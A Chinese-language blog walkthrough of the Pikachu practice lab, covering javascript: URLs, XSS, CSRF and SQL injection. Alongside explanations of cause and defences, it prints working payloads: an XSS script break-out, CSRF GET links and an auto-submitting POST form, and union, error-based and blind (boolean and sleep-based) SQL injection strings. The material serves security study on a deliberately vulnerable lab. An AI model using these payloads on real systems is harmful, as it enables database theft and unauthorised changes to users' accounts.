<p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。这样的URL如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:var now = new Date(); &quot;<span class="tag">&lt;<span class="name">h1</span>&gt;</span>The time is:<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>&quot; + now;</span><br></pre></td></tr></table></figure>

<p>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</p>
<p>在浏览器打开javascript：URL的时候，它会先运行URL中的代码，当返回值不为undefined的时候，前页链接会替换为这段代码的返回值。</p>
<p>javascript URL还可以含有只执行动作，但不返回值的javascript语句。例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&quot;hello world!&quot;)</span><br></pre></td></tr></table></figure>

<p>装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</p>
<p>通常我们想用javascript:URL执行某些不改变当前显示的文档的javascript代码。要做到这一点，必须确保URL中的最后一条语句没有返回值。一种方法是用void运算符显式地把返回值指定为underfined，只需要在javascript:URL的结尾使用语句void 0;即可。例如：下面的URL将打开一个新的空浏览器窗口，而不改变当前窗口的内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:window.open(&quot;about:blank&quot;); void 0;</span><br></pre></td></tr></table></figure>

<p>如果这个URL没有void运算符，window.open()方法的返回值将被转换成字符串并被显示出来，当前窗口将被如下所示的文档覆盖。</p>
</blockquote>
<h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>网页源代码如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210223180445204-704647562.png"
                      alt="img"
                ></p>
<p>则可通过闭合前面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>来执行我们想要的操作</p>
<p>即构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="附-1"><a href="#附-1" class="headerlink" title="附"></a>附</h2><p>xss：<a class="link"   href="https://www.cnblogs.com/dogecheng/p/11556221.html" >xss漏洞测试<i class="fas fa-external-link-alt"></i></a></p>
<p>xss之htmlspecialchars：<a class="link"   href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" >PHP htmlspecialchars() 函数<i class="fas fa-external-link-alt"></i></a></p>
<p>javascript伪协议：<a class="link"   href="https://www.cnblogs.com/forforever/p/12711197.html" >javascript伪协议<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="XSS攻击流程"><a href="#XSS攻击流程" class="headerlink" title="XSS攻击流程"></a>XSS攻击流程</h3><p>假设存在漏洞的是一个论坛，攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中</p>
<p>当用户访问这个页面时，都会执行这个恶意的JS代码，这个代码就会在用户的浏览器端执行</p>
<h3 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a>XSS攻击类型</h3><p>危害：存储型 &gt; 反射型 &gt; DOM型</p>
<ul>
<li>反射型：交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询页面等</li>
<li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面</li>
<li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型</li>
</ul>
<h3 id="XSS形成原因"><a href="#XSS形成原因" class="headerlink" title="XSS形成原因"></a>XSS形成原因</h3><p>形成XSS漏洞的主要原因是程序中输入和输出的控制不够严格</p>
<p>导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行</p>
<h3 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h3><p>  ① 在目标上找输入点，比如查询接口、留言板</p>
<p>  ② 输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理</p>
<p>  ③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）</p>
<p>  ④ 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><blockquote>
<h3 id="CSRF-跨站请求伪造-概述"><a href="#CSRF-跨站请求伪造-概述" class="headerlink" title="CSRF(跨站请求伪造)概述"></a>CSRF(跨站请求伪造)概述</h3><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p>
<h3 id="列举场景"><a href="#列举场景" class="headerlink" title="列举场景"></a>列举场景</h3><p>这里列举一个场景解释一下，希望能够帮助你理解。</p>
<p><strong>场景需求：</strong></p>
<p>小黑想要修改大白在购物网站tianxie<a class="link"   href="http://www.xx.com上填写的会员地址./" >www.xx.com上填写的会员地址。<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>先看下大白是如何修改自己的密码的：</strong></p>
<p>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：</p>
<p>1，登录权限 2，修改个人信息的请求。<br>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>【<a class="link"   href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change%E3%80%91" >http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】<i class="fas fa-external-link-alt"></i></a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。<br><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong></p>
<p>1.<a class="link"   href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/" >www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造<i class="fas fa-external-link-alt"></i></a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
</blockquote>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>在尝试修改个人信息界面进行如下填写并抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210224194152043-1176009886.png"
                      alt="img"
                ></p>
<p>直接修改链接内容让受害者点击即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210224194316858-2090277974.png"
                      alt="img"
                ></p>
<p>构造如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=2&amp;add=3&amp;email=4&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>如若受害者在登录状态点击该链接，即可达到攻击的目的</p>
<p>get请求修改个人信息，所以内容均在url中体现，即可构造攻击连接</p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>post与get不同，不可通过构造攻击连接进行攻击</p>
<p>攻击者可以搭建一个站点，在站点上做一个表单，诱导受害者点击这个链接</p>
<p>受害者点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息</p>
<p>编写一个post.html</p>
<p>代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost//pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0220&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0220@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>笔者存放位置为 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://localhost//jennie/post.html </span><br></pre></td></tr></table></figure>

<p>即受害者点击笔者存该改页面链接时收到攻击</p>
<h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p>CSRF的主要问题是敏感操作容易被伪造</p>
<p>加入一个随机的token使之不易被伪造</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210224200741985-235595431.png"
                      alt="img"
                ></p>
<p>每次请求多了一个随机的token值，这是一个相对安全的</p>
<h2 id="附-2"><a href="#附-2" class="headerlink" title="附"></a>附</h2><p>CSRF：<a class="link"   href="https://www.cnblogs.com/dogecheng/p/11583412.html" >CSRF<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><blockquote>
<p>CSRF 是 Cross Site Request Forgery 的 简称，中文名为跨域请求伪造</p>
<p>在CSRF的攻击场景中，攻击者会伪造一个请求（一般是一个链接）</p>
<p>然后欺骗目标用户进行点击，用户一旦点击了这个请求，这个攻击也就完成了</p>
<p>所以CSRF攻击也被称为“one click”攻击</p>
</blockquote>
<h3 id="CSRF攻击需要条件"><a href="#CSRF攻击需要条件" class="headerlink" title="CSRF攻击需要条件"></a>CSRF攻击需要条件</h3><blockquote>
<p>  ① 目标网站没有对修改个人信息修改的请求进行防CSRF处理，导致该请求容易被伪造</p>
<p>因此，判断一个网站有没有CSRF漏洞，其实就是判断对关键信息（密码等）的操作（增删改）是否容易被伪造</p>
<p>  ② lucy点击伪造的请求链接时有登录状态（已经登陆了目标网站），如果lucy没有登录，那么即便lucy点击了链接也没有作用</p>
<p>从CSRF的利用条件来看，CSRF的利用难度会大一些，所以CSRF对应的安全级别低一些</p>
</blockquote>
<h3 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h3><blockquote>
<p>我们利用XSS可以达到盗取用户Cookie的目的，那么CSRF的区别在哪？</p>
<ul>
<li>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。</li>
<li>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</li>
</ul>
</blockquote>
<h3 id="如何确认一个目标站点是否有CSRF漏洞"><a href="#如何确认一个目标站点是否有CSRF漏洞" class="headerlink" title="如何确认一个目标站点是否有CSRF漏洞"></a>如何确认一个目标站点是否有CSRF漏洞</h3><blockquote>
<p> 对目标站点增删改查的地方进行标记，并观察逻辑，判断请求是否可以伪造。</p>
<ul>
<li>比如修改管理员账号时，不需要验证旧密码</li>
<li>比如修改敏感信息不需要token验证</li>
</ul>
<p> 确认凭证的有效期</p>
<p>虽然退出或关闭了览器，但Cookie仍然有效，或者Session没有及时过期，导致CSRF攻击变得简单</p>
</blockquote>
<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul>
<li><blockquote>
<p>增加Token验证（常用做法）</p>
</blockquote>
<ul>
<li>对关键操作增加Token参数，token必须随机，每次都不一样</li>
</ul>
</li>
<li><blockquote>
<p>关于安全的会话管理（避免会话被利用）</p>
</blockquote>
<ul>
<li>不要在客户端保存敏感信息（比如身份验证信息）</li>
<li>退出、关闭浏览器时的会话过期机制</li>
<li>设置会话过机制，比如15分钟无操作，则自动登录超时</li>
</ul>
</li>
<li><blockquote>
<p>访问控制安全管理</p>
</blockquote>
<ul>
<li>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码</li>
<li>敏感信息的修改使用POST，而不是GET</li>
<li>通过HTTP头部中的REFERER来限制原页面</li>
</ul>
</li>
<li><blockquote>
<p>增加验证码</p>
</blockquote>
<ul>
<li>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</li>
</ul>
</li>
</ul>
<h1 id="SQL-inject"><a href="#SQL-inject" class="headerlink" title="SQL-inject"></a>SQL-inject</h1><blockquote>
<p>SQL注入概述</p>
<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。<br>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
</blockquote>
<h2 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h2><p>抓包后，取id=2与id=3-1得到相同回显</p>
<p>即存在数字型注入</p>
<p>按部就班以从《从0到1》上学到的关于数字型注入的方法</p>
<p>事先已经先通过id=2与id=3-1得到相同回显判断这里存在数字型注入</p>
<p>且MySQL5.0版本后默认自带数据库information_schema，所有数据库名、表名、字段名都可从中查询</p>
<p>利用这一点，构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302141129001-2050373802.png"
                      alt="img"
                ></p>
<p>对查询到的表进行二次查询，构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;member&#x27;</span></span><br></pre></td></tr></table></figure>

<p>即为查询member中内容</p>
<p>我就只查询member中内容便发现我们想要的id与email</p>
<p>构造查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> id,email <span class="keyword">from</span> <span class="keyword">member</span></span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302142149894-80111615.png"
                      alt="img"
                ></p>
<p>或输入id=1 or 1=1亦可展示所有信息</p>
<h2 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h2><p>字符型需闭合前面的单引号，再注释查询内容后面的语句</p>
<p>构造时符号使用的为URL编码</p>
<p>在查询后面加入相应符号URL编码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302145427622-649417389.png"
                      alt="img"
                ></p>
<p>查询执行成功</p>
<p>在两符号中间插入上文所提到的查询语句即可</p>
<p>构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(table_name)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>得到回显</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302145722111-1040084394.png"
                      alt="img"
                ></p>
<p>最后得到所有信息如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302145905787-1567657331.png"
                      alt="img"
                ></p>
<p>同样的查询语句输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>亦可</p>
<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>题目提示输入用户名的一部分进行查找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302200417159-188993251.png"
                      alt="img"
                >构造闭合%‘</p>
<p>即构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="string">&#x27;查询#</span></span><br></pre></td></tr></table></figure>

<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>依旧是按要求构造闭合</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210302200825298-485353197.png"
                      alt="img"
                ></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27;) 查询#</span></span><br></pre></td></tr></table></figure>

<h2 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h2><p>在insert/update/delete注入这几种情况中</p>
<p>不能使用 union 进行联合查询</p>
<p>因为这不是查询，而是操作</p>
<p>insert 设置用户名</p>
<p>这里一般通过or进行闭合</p>
<p>选择注册</p>
<p>在用户名栏中构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">BEACON<span class="string">&#x27; or updatexml(1, concat(0x7e,database()), 0) or &#x27;</span></span><br></pre></td></tr></table></figure>

<p>利用报错进行我们的操作</p>
<p>update 修改密码</p>
<p>一样的构造，亦可</p>
<h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p>在进行删除时，抓包修改id值为我们构造的代码即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>,database()), <span class="number">0</span>) </span><br></pre></td></tr></table></figure>

<h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151627255-1247728998.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151654953-1642833503.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304151724362-1537892774.png"
                      alt="img"
                ></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; or updatexml(1, concat(0x7e, database()), 0)#</span></span><br></pre></td></tr></table></figure>

<h2 id="盲注（base-on-boolian）"><a href="#盲注（base-on-boolian）" class="headerlink" title="盲注（base on boolian）"></a>盲注（base on boolian）</h2><blockquote>
<p>基于真假的盲注主要特征</p>
</blockquote>
<ul>
<li><blockquote>
<p>没有报错信息</p>
</blockquote>
</li>
<li><blockquote>
<p>不管是正确的输入，还是错误的输入，都只有两种情况（可以看做 0 or 1）</p>
</blockquote>
</li>
<li><blockquote>
<p>在正确的输入下，后面跟 and 1=1 / and 1=2 进行判断</p>
</blockquote>
</li>
</ul>
<p>测试语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br></pre></td></tr></table></figure>

<p>前者可行，后者提示用户名不存在</p>
<p>此处输出仅有用户名存在与不存在两种形式，故不能使用之前基于报错注入的形式</p>
<blockquote>
<p>我们只能通过 真 或者 假 来获取数据，所以手工盲注是很麻烦的</p>
<p>我们可以先用 length(database()) 判断 数据库名称的长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and length(database())&gt;5#</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span>#</span><br></pre></td></tr></table></figure>

<p>再用 substr() 和 ascii() 判断数据库由哪些字母组成（可以用二分法）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and ascii(substr(database(), 1, 1)) &gt; 113#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> ascii(substr(database(), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">105</span>#</span><br><span class="line">……</span><br><span class="line">kobe<span class="string">&#x27; and ascii(substr(database(), 1, 1)) = 112#</span></span><br></pre></td></tr></table></figure>

<p>不断重复，然后取得数据库名。再和 information_schema 和 length 猜测 表名 的长度，我们可以用下面的 SQL 语句替代上面的 database()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>先判断表名长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and  length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,100)) = 8#</span></span><br></pre></td></tr></table></figure>

<p>然后猜解表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) &gt; 113#</span></span><br><span class="line"><span class="string">……</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">=</span><span class="number">104</span>#</span><br></pre></td></tr></table></figure>

<p>同样的方法去猜解列名、数据，就是麻烦，用工具会方便些</p>
</blockquote>
<h2 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h2><blockquote>
<p>基于真假的盲注可以看到回显的信息，正确 or 错误</p>
<p>基于时间的注入就什么都看不到了，我们通过特定的输入，判断后台执行的时间，从而确定注入点，比如用 sleep() 函数</p>
<p>在皮卡丘平台一，无论输入什么，前端都是显示 “I don’t care who you are!”</p>
<p>我们按 F12 打开控制台，选到网络</p>
<p>然后我们输入下面的 payload 进行测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and sleep(5)#</span></span><br></pre></td></tr></table></figure>

<p>如果存在注入点，后端就会 sleep 5秒才会返回执行结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210304153126235-256397198.png"
                      alt="img"
                ></p>
<p>看到上面的结果说明我们注入成功了，构造下面的 payload，用 database() 取得数据库的名称，再用 substr 取字符判断数据库名称的组成，如果猜解成功就会 sleep 5秒，否则没有任何动作</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and  if((substr(database(), 1, 1))=&#x27;</span>p<span class="string">&#x27;, sleep(5), null)#</span></span><br></pre></td></tr></table></figure>

<p>后面也跟真假注入是一样的了，替换 database() 就可，如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and  if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))=&#x27;</span>h<span class="string">&#x27;, sleep(5), null)#</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h2 id="附-3"><a href="#附-3" class="headerlink" title="附"></a>附</h2><p>SQL注入：<a class="link"   href="https://www.cnblogs.com/dogecheng/p/11616282.html" >SQL注入<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="发生原因"><a href="#发生原因" class="headerlink" title="发生原因"></a>发生原因</h3><blockquote>
<p>SQL注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄漏的一种漏洞。</p>
</blockquote>
<h3 id="SQL注入攻击流程"><a href="#SQL注入攻击流程" class="headerlink" title="SQL注入攻击流程"></a>SQL注入攻击流程</h3><blockquote>
<p>第一步：注入点探测</p>
<ul>
<li>自动方式：使用web漏洞扫描工具，自动进行注入点发现</li>
<li>手动方式：手工构造SQL注入测试语句进行注入点发现</li>
</ul>
<p>第二步：信息获取</p>
<p> 通过注入点取得期望得到的数据</p>
<ul>
<li>1.环境信息：数据库类型，数据库版本，操作系统版本，用户信息等</li>
